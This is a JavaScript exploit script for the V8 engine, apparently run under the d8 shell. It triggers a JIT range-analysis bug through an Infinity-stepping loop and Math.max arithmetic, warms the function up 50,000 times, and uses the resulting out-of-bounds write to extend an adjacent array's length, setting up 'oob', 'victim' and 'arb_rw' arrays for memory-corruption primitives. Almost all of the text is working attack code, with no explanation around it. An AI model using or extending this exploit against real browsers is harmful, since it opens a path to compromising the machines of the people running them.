///////////////////////////////////////////////////////////// Offsets Needed for Exploit ////////////////////////////////////////////////////////////

DEBUG = false;

TRIGGERED_INDEX_OF_OOB_LENGTH = 22;

/////////////////////////////////////////////////////////////// Array Length Extension //////////////////////////////////////////////////////////////

function newArrayLen(new_len) {
	old_len = triggered[TRIGGERED_INDEX_OF_OOB_LENGTH];
	triggered[TRIGGERED_INDEX_OF_OOB_LENGTH] = new_len;
	
	if (DEBUG) {
		if (oob.length != new_len) {
			console.log("Length change unsuccessful");
		} else {
			console.log("Length changed from " + old_len + " to " + new_len);
		}
	}
	
	return old_len;
}

///////////////////////////////////////////////////////// Function to Trigger Vulnerability /////////////////////////////////////////////////////////

function trigger() {
	var x = -Infinity;
	var k = 0;
	for (var i = 0; i < 1; i += x) {
		if (i == -Infinity) {
			x = +Infinity;
		}

		if (++k > 10) {
			break;
		}
	}

	var value = Math.max(i, 1024);
	value = -value;
	value = Math.max(value, -1025);
	value = -value;
	value -= 1022;
	value >>= 1;
	value += 10;

	var array = Array(value);
	array[0] = 1;	// changed array's type
	return [array, [1.1], [{}, {}, {}, {}], [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8]];	// changed return values
};

///////////////////////////////////////////////////////// Function to Trigger Vulnerability /////////////////////////////////////////////////////////

for (let i = 0; i < 50000; ++i) {	// 20000 wasn't reliable in GDB
	trigger();
}

//////////////////////////////////////////////////////// Create Global Arrays for Primitives ////////////////////////////////////////////////////////

var arrays = trigger();
var triggered = arrays[0];
var oob = arrays[1];
var victim = arrays[2];
var arb_rw = arrays[3];

arrays = trigger();

if (DEBUG) {
	console.log("Debug info for triggered array");
	%DebugPrint(triggered);

	console.log("Debug info for oob array");
	%DebugPrint(oob);

	console.log("Debug info for victim array");
	%DebugPrint(victim);

	console.log("Debug info for arb_rw array");
	%DebugPrint(arb_rw);
}

newArrayLen(0x1000);

console.log(oob[10]);

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// ./d8 2.js --allow-natives-syntax
